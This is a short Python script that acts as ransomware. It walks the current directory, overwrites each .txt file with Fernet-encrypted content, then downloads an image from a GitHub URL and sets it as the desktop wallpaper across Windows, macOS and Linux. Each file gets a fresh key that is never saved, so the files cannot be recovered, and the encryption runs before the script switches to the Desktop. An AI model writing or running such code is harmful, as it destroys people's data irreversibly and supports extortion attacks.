from cryptography.fernet import Fernet
import os
import ctypes
import platform
import urllib.request

# Generate key
key=Fernet.generate_key()

# Change directory
def change_to_desktop():
    system = platform.system()

    if system == "Windows":
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    elif system == "Darwin":  # macOS
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    elif system == "Linux":
        # This assumes a standard GNOME desktop environment
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    else:
        print("Unsupported operating system.")
        return

    try:
        os.chdir(desktop_path)
        print(f"Changed working directory to Desktop: {desktop_path}")
    except FileNotFoundError:
        print(f"Desktop directory not found: {desktop_path}")

# Save key to file
with open("key.key","wb") as f:
    f.write(key)

# Create Fernet object with the generated key
fernet = Fernet(key)

# Encrypt content of text files
# Function to list and encrypt text files on the Desktop
def encrypt():
    try:
        for root, dirs, files in os.walk(os.getcwd()):
            for file_name in files:
                if file_name.endswith(".txt"):
                    file_path = os.path.join(root, file_name)

                    with open(file_path, "r") as f:
                        data = f.read()

                    key = Fernet.generate_key()
                    fernet = Fernet(key)
                    encrypted = fernet.encrypt(data.encode())

                    with open(file_path, "wb") as f:
                        f.write(encrypted)

                    print(f"Encrypted {file_name} on the Desktop.")
    except FileNotFoundError:
        print("Error encrypting files. Desktop directory not found.")


            # print(encrypted)
                
            # # add new extention   
            # new_file_path =  j + ".asu"
            # os.rename(j, new_file_path)

# Get the file
def download_file(url, destination):
    urllib.request.urlretrieve(url, destination)

# Change Wallpaper
def change_wallpaper(file_path):
    system = platform.system()
    if system == "Windows":
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)
    elif system == "Darwin":
        script = f'tell application "Finder"\nset desktop picture to POSIX file "{file_path}"\nend tell'
        os.system(f"osascript -e '{script}'")
    elif system == "Linux":
        os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{file_path}")
    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
    download_path = os.path.abspath("bt.jpg")

    #Encryption
    encrypt()

    # Desktop directory
    change_to_desktop()

    # Download the file
    download_file(wallpaper_url, download_path)

    # Change the wallpaper using the downloaded file
    change_wallpaper(download_path)

    # Optionally, remove the downloaded file after changing the wallpaper
    # os.remove(download_path)